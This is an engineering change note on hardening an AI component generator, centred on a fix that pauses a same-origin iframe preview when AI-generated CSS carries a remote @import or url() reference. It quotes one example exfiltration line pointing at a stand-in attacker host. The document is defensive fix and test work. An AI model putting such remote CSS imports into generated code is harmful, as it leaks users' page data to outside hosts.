---
date: 2026-07-20
status: shipped
area: studio / component generation
summary: Trio-directed hardening of the component generator (folded into the manual-refine
  PR). A HIGH security fix — the Fabricate preview now withholds CSS that carries a blocked
  remote reference from the same-origin srcdoc frame (#22) — plus four smaller guards: an
  effort-regression guard (a self-refine round must strictly beat the model's own rating of
  the original), a one-click Undo before every generate/refine overwrite, a no-op guard on
  refineComponent, an honest gate-repair count when effort swaps in a design round, and a
  recursion cap on the two untrusted-CSS walkers.
---

# Hardening the component generator (the trio's findings)

## Context

The four component-generation increments (dedup, gate-repair, the effort dial, manual
refine) shipped fast. Before merging the manual-refine PR (#1118) the change was put
through the adversarial trio (HARD RULE #25 — red team + Munger inversion + independent
checker). The trio surfaced one HIGH-severity security hole and a cluster of smaller
correctness/UX gaps. All are folded into #1118 here rather than chased as follow-ups —
they touch the same files and share the same review.

## F1 — the preview CSS-exfil hole (HIGH)

**The hole.** The Fabricate Component tab previews the draft in a SAME-ORIGIN, un-sandboxed
`srcdoc` iframe. `single-slide-render.ts`'s `srcdoc()` sanitizes the slide *HTML* through
`sanitizeSlideHtml` (HARD RULE #22) but concatenates `extraCss` **raw**. The gate already
flags a remote `@import` / `url()` / CSS binding / expression as a `css-*` exfil finding —
but `LayoutStudio.tsx` passed `extraCss={css}` to the preview *regardless of the findings*.
So an AI-generated (or pasted) stylesheet with `@import url(https://attacker/x.css)` reached
the live frame and fired — the exact #616 §5.1 channel the sanitizer exists to close, just
via the CSS side door instead of the HTML one.

**The fix.** `LayoutStudio` now computes `cssBlocked = findings.some(f => f.rule.startsWith('css-'))`
and passes `extraCss={cssBlocked ? '' : css}`. When blocked, the skeleton still previews
(so the author isn't flying blind) and a "Preview paused: the CSS has a blocked remote
reference" note points them at the `css-` finding to fix. The guard reuses the findings the
Studio *already* computed — no new import, no bundle growth — and sits exactly on the seam
where AI-authored CSS flows into a frame. Verified on the real built Studio (below).

Why here and not in `srcdoc()` itself: the render helper is a low-level primitive with
many callers (some trusted); the gate + findings live at the Studio layer, which is the
one surface that renders *untrusted AI CSS*. Blocking at the trusted primitive would need
the gate wired into every caller; blocking where the untrusted CSS originates is tighter.

## The four smaller guards

- **Effort-regression guard.** `improveDesign` used to seed `bestRating = -1`, so ANY
  clean, rated self-refine round beat the (ungraded) first draft — a round could trade a
  strong first draft for a weaker "improved" one and still win. The refine prompt now asks
  for a **`baselineRating`** (the model's honest score of the design AS GIVEN) alongside
  its `rating` of the improved output, on the same scale; `coerceRefinement` parses it
  (clamped 1–10, `null` when absent); `improveDesign` seeds the bar from the first round's
  baseline, so a round must rate its output **strictly above** how the model rated the
  original to win. Absent a baseline (a model that omits it) it falls back to the old
  ungraded bar — never silently rejecting improvements.
- **Undo before overwrite.** Generate/refine/effort REPLACE the whole component
  (name/desc/css/skeleton/manifest), so one prompt could silently eat a hand-tuned draft.
  Fabricate now snapshots the outgoing draft the instant before it's overwritten and shows
  a one-click **Undo last change** control (single level — the last overwrite). `notify`
  can't carry an action, so the affordance is a dedicated button gated on a snapshot, not a
  toast action.
- **No-op guard on `refineComponent`.** If the model echoes the draft back unchanged (it
  applied nothing), the bridge now returns `nochange` instead of claiming a "Refined" — the
  author's draft already stands. Mirrors `refineSelection`'s `next === text` check, via a
  field-by-field `sameComponentDraft` compare.
- **Honest gate-repair count.** `improveDesign` now returns the WINNING candidate's repair
  count, and `generateComponent` reports that when a design round wins — so "auto-fixed N
  gate passes" describes the draft actually shown, not the discarded first draft's repairs.

## The recursion cap (defense on untrusted CSS)

Both CSS walkers that recurse through `@media`/`@supports` nesting — `gate.js`'s `eachRule`
and `ai.js`'s `addScopePrefix` rewriter — run on untrusted, AI-generated CSS with no depth
bound. A pathologically deep nest could blow the JS stack (a tab crash). Both now cap the
descent at 32 levels (real component CSS nests one or two); past it, `eachRule` stops
descending and `addScopePrefix` bails the whole auto-fix (the original stands and the gate
still flags the leak). The structural regex gates (hex/margin) run on the whole string
regardless, so nothing slips.

## Verification

**Real surface (HARD RULE #23), built Studio via the dev server, Chromium:**

- **F1** — opened Fabricate → Component, typed CSS carrying `@import`/`url()` to a remote
  host into the CSS field. The gate flagged a `css-*` finding, the **"Preview paused"** note
  appeared, and the exfil URL was absent from BOTH the preview iframe's `srcdoc` AND its
  parsed document. Clearing the CSS restored the flow (the note vanished, clean CSS returned
  to the frame) — the guard pauses, it does not permanently block.
- **Undo** — with a mocked OpenRouter endpoint returning a clean component: no Undo control
  before any overwrite; Generate replaced the draft (name → `signal-row`, CSS changed) and
  the Undo control appeared; clicking it restored the starter name + CSS exactly and the
  control hid again.

**Unit / component:** `component-ai.test.js` (+`baselineRating` parsing, the refine prompt's
same-scale baseline ask, and a 200-deep-nest no-crash test for both walkers);
`architect.test.ts` (+regression-guard accept/reject rounds, +the `refineComponent` no-op
echo → `nochange`); `LayoutStudio.test.tsx` (+the F1 guard withholds `extraCss` on a `css-*`
finding and shows the note, +a non-exfil finding still previews). Full studio suite, biome,
typecheck, build:check green.

UNVERIFIED: iOS Safari's `srcdoc` handling of the paused/restored transition (no device
reachable from the sandbox) — the guard is CSS-string logic with no iOS-specific surface, so
the risk is low, but it is not driven on-device.
